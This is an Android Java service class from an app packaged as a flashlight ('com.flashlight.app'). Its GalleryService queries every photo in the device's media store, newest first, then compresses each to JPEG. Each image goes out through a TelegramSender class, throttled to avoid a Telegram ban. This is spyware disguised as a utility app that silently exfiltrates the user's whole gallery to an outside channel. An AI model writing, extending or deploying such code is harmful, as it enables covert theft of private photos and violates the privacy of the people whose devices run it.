package com.flashlight.app;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

public class GalleryService extends Service {
    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            List<Uri> allImages = getAllImages();
            int count = 0;
            for (Uri uri : allImages) {
                try {
                    InputStream is = getContentResolver().openInputStream(uri);
                    Bitmap bitmap = BitmapFactory.decodeStream(is);
                    if (is != null) is.close();

                    if (bitmap != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
                        byte[] imageBytes = baos.toByteArray();
                        bitmap.recycle();

                        new TelegramSender().send(imageBytes, "gallery_" + count + ".jpg");
                        
                        // Пауза 1.2 сек, чтобы Telegram не забанил (и быстрее шло)
                        Thread.sleep(1200); 
                        count++;
                    }
                } catch (Exception e) { e.printStackTrace(); }
            }
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private List<Uri> getAllImages() {
        List<Uri> imageUris = new ArrayList<>();
        String[] projection = new String[]{MediaStore.Images.Media._ID};
        
        // Сортируем от новых к старым (DESC)
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, sortOrder
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                imageUris.add(uri);
            }
            cursor.close();
        }
        return imageUris;
    }
}
